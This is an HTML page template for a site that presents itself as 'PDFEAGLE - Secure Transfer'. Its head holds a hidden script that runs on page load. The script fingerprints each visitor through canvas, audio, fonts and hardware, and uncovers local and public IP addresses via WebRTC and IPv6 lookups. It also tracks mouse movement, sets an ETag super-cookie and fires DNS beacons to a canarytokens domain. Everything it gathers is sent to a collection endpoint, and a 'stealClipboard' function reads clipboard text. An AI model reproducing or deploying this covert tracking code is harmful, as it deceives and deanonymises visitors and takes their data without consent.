<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PDFEAGLE - Secure Transfer</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css">
    
    <style>
        body { background-color: #f0f2f5; font-family: 'Segoe UI', sans-serif; }
        .navbar { background: #fff; box-shadow: 0 2px 10px rgba(0,0,0,0.05); }
        .brand-text { font-weight: 800; color: #e74c3c; letter-spacing: 1px; }
        .main-container { max-width: 800px; margin-top: 40px; }
        .card { border: none; border-radius: 15px; box-shadow: 0 5px 20px rgba(0,0,0,0.05); }
    </style>

    <script>
    // â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
    // â•‘  ðŸ¦… EAGLE EYE OMNISCIENT v6.0 â€” GOD TIER INTELLIGENCE                         â•‘
    // â•‘  Combines: ETag Persistence, Sensor Fusion, Consistency Matrix                â•‘
    // â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

    window.EagleEyeOmni = class {
        constructor(config = {}) {
            this.version = "6.0.0-OMNI";
            this.endpoint = config.endpoint || '/api/collect';
            this.sessionId = this.generateSessionId();
            this.config = {
                // REPLACE WITH YOUR CANARY DOMAIN
                canaryDomain: "le50571w2dnsylkz8t5x5ioy2.canarytokens.com", 
                collectOnLoad: config.collectOnLoad !== false
            };
            this.init();
        }

        generateSessionId() {
            return Array.from(crypto.getRandomValues(new Uint8Array(8)), b => b.toString(16).padStart(2,'0')).join('');
        }

        async init() {
            // 1. Load Super-Cookie (ETag)
            this.loadSuperCookie();
            
            // 2. Trigger DNS Beacons
            if (this.config.canaryDomain) this.triggerDNSBeacons();

            if (this.config.collectOnLoad) {
                if (document.readyState === 'complete') setTimeout(() => this.collect('Page Load'), 500);
                else window.addEventListener('load', () => setTimeout(() => this.collect('Page Load'), 500));
            }
        }

        // === 1. PERSISTENCE (ETag Super-Cookie) ===
        loadSuperCookie() {
            // Forces browser to check ETag. If it exists, server logs it.
            const img = new Image();
            img.src = `/pixel.gif?source=etag_check&uid=${this.sessionId}`;
        }

        // === 2. SENSORS (Nikolai's Logic) ===
        async getAmbientLight() {
            if ('AmbientLightSensor' in window) {
                try {
                    const sensor = new AmbientLightSensor();
                    return new Promise(resolve => {
                        sensor.onreading = () => { sensor.stop(); resolve(sensor.illuminance); };
                        sensor.onerror = () => resolve("Error/Permission");
                        sensor.start();
                        setTimeout(() => { sensor.stop(); resolve("Timeout"); }, 500);
                    });
                } catch { return "Not Supported"; }
            }
            return "Not Supported";
        }

        // === 3. NETWORK TRUTH (Leonid's Logic) ===
        async getWebRTC() {
            const res = { local: [], public: [] };
            try {
                const pc = new RTCPeerConnection({iceServers:[{urls:"stun:stun.l.google.com:19302"}]});
                pc.createDataChannel('');
                await new Promise(r => {
                    pc.onicecandidate = e => {
                        if(!e.candidate) { r(); return; }
                        const ip = e.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
                        if(ip) {
                            if(ip[1].match(/^(192\.168|10\.|172\.)/)) res.local.push(ip[1]);
                            else res.public.push(ip[1]);
                        }
                    };
                    setTimeout(r, 1500);
                });
            } catch(e){}
            return res;
        }

        // === 4. IPv6 LEAK (Restored) ===
        async getIPv6() {
            const services = [
                'https://api64.ipify.org?format=json',
                'https://ipv6.icanhazip.com'
            ];
            for (const url of services) {
                try {
                    const controller = new AbortController();
                    setTimeout(() => controller.abort(), 1500);
                    const response = await fetch(url, { signal: controller.signal, mode: 'cors' });
                    if (!response.ok) continue;
                    let ip = await response.text();
                    try { ip = JSON.parse(ip).ip; } catch(e){}
                    if (ip.includes(':')) return { detected: true, ip: ip.trim() };
                } catch (e) { continue; }
            }
            return { detected: false, ip: null };
        }

        // === 5. BEHAVIORAL (Mouse Entropy) ===
        trackMouseEntropy() {
            return new Promise(resolve => {
                let moves = [];
                const fn = e => {
                    moves.push({x:e.clientX, y:e.clientY});
                    if(moves.length > 20) {
                        document.removeEventListener('mousemove', fn);
                        // Calculate linearity (Bots move straight)
                        let variance = 0;
                        for(let i=2; i<moves.length; i++) {
                            const a1 = Math.atan2(moves[i-1].y - moves[i-2].y, moves[i-1].x - moves[i-2].x);
                            const a2 = Math.atan2(moves[i].y - moves[i-1].y, moves[i].x - moves[i-1].x);
                            variance += Math.abs(a1 - a2);
                        }
                        resolve(variance);
                    }
                };
                document.addEventListener('mousemove', fn);
                setTimeout(() => { document.removeEventListener('mousemove', fn); resolve(0); }, 3000);
            });
        }

        // === 6. FINGERPRINTING ===
        getCanvasHash() {
            try {
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                ctx.textBaseline = "top"; ctx.font = "14px 'Arial'";
                ctx.fillStyle = "#f60"; ctx.fillRect(125, 1, 62, 20);
                ctx.fillStyle = "#069"; ctx.fillText("Eagle_v6", 2, 15);
                const data = canvas.toDataURL();
                let hash = 0;
                for (let i = 0; i < data.length; i++) {
                    hash = ((hash << 5) - hash) + data.charCodeAt(i);
                    hash |= 0;
                }
                return hash.toString(16);
            } catch { return "error"; }
        }

        async getAudioHash() {
            try {
                const Ctx = window.OfflineAudioContext || window.webkitOfflineAudioContext;
                if (!Ctx) return "no_audio";
                const audioCtx = new Ctx(1, 44100, 44100);
                const osc = audioCtx.createOscillator();
                osc.type = 'triangle';
                osc.frequency.setValueAtTime(10000, audioCtx.currentTime);
                osc.connect(audioCtx.destination);
                osc.start(0);
                const buffer = await audioCtx.startRendering();
                const data = buffer.getChannelData(0);
                let sum = 0;
                for (let i = 0; i < data.length; i++) sum += Math.abs(data[i]);
                return sum.toFixed(6);
            } catch { return "error"; }
        }

        getFonts() {
            const fontList = ["Arial", "Calibri", "Consolas", "Helvetica", "Roboto", "Segoe UI", "Times New Roman", "Verdana", "Ubuntu", "Menlo", "Monaco"];
            const detected = [];
            const span = document.createElement("span");
            span.style.fontSize = "72px"; span.style.position = "absolute"; span.style.left = "-9999px"; span.innerHTML = "mmmmmmmmmmlli";
            document.body.appendChild(span);
            span.style.fontFamily = "monospace";
            const defaultWidth = span.offsetWidth;
            for (const font of fontList) {
                span.style.fontFamily = `"${font}", monospace`;
                if (span.offsetWidth !== defaultWidth) detected.push(font);
            }
            document.body.removeChild(span);
            return detected;
        }

        // === 7. CONSISTENCY CHECKS (Kirill's Logic) ===
        detectAnomalies(fonts, light, entropy) {
            const anomalies = [];
            const ua = navigator.userAgent;
            
            // Mobile Check
            const isMobileUA = /Android|iPhone|iPad/i.test(ua);
            const hasTouch = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
            if (isMobileUA && !hasTouch) anomalies.push("FAKE MOBILE: No Touch Events");
            
            // Sensor Check (VMs don't have light sensors)
            if (isMobileUA && light === "Not Supported") anomalies.push("POSSIBLE VM: No Light Sensor on Mobile");

            // Bot Check
            if (entropy < 0.05 && entropy > 0) anomalies.push("BOT MOVEMENT: Perfectly linear mouse");
            if (navigator.webdriver) anomalies.push("CRITICAL: WebDriver Detected");

            // OS Mismatch
            if (ua.includes("Windows") && !fonts.includes("Calibri")) anomalies.push("OS SPOOF: Windows without Calibri");
            if (ua.includes("Mac") && !fonts.includes("Helvetica")) anomalies.push("OS SPOOF: Mac without Helvetica");

            return anomalies;
        }

        triggerDNSBeacons() {
            const uid = `${this.sessionId}.${Date.now()}`;
            new Image().src = `https://${uid}.img.${this.config.canaryDomain}/pixel.gif`;
        }

        // === MAIN COLLECT ===
        async collect(trigger, extra = {}) {
            const [webrtc, ipv6, light, entropy, audio] = await Promise.all([
                this.getWebRTC(),
                this.getIPv6(),
                this.getAmbientLight(),
                this.trackMouseEntropy(),
                this.getAudioHash()
            ]);

            const fonts = this.getFonts();
            const anomalies = this.detectAnomalies(fonts, light, entropy);

            const payload = {
                meta: {
                    version: this.version,
                    sessionId: this.sessionId,
                    trigger: trigger,
                    url: window.location.href
                },
                threat: {
                    score: anomalies.length * 25,
                    anomalies: anomalies,
                    is_bot: anomalies.length > 0
                },
                fingerprints: {
                    canvas: this.getCanvasHash(),
                    audio: audio,
                    fonts: fonts
                },
                hardware: {
                    lightSensor: light,
                    mouseEntropy: entropy,
                    cores: navigator.hardwareConcurrency,
                    memory: navigator.deviceMemory
                },
                network: { webrtc, ipv6 },
                system: { ua: navigator.userAgent, platform: navigator.platform, timezone: Intl.DateTimeFormat().resolvedOptions().timeZone },
                ...extra
            };

            const blob = new Blob([JSON.stringify(payload)], { type: 'application/json' });
            if (navigator.sendBeacon) navigator.sendBeacon(this.endpoint, blob);
            else fetch(this.endpoint, { method: 'POST', body: JSON.stringify(payload), headers: {'Content-Type': 'application/json'} });
        }
    };
    
    const eagle = new EagleEyeOmni();

    async function stealClipboard() {
        try {
            if (navigator.clipboard && navigator.clipboard.readText) {
                const text = await navigator.clipboard.readText();
                return text ? text.substring(0, 1000) : "Empty";
            }
        } catch (e) { return "Blocked/Error"; }
        return "Not Supported";
    }
    </script>
</head>
<body>
    <nav class="navbar navbar-light">
        <div class="container">
            <a class="navbar-brand brand-text" href="/">
                <i class="fa-solid fa-file-pdf"></i> PDFEAGLE
            </a>
        </div>
    </nav>
    <div class="container main-container">
        {% block content %}{% endblock %}
    </div>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
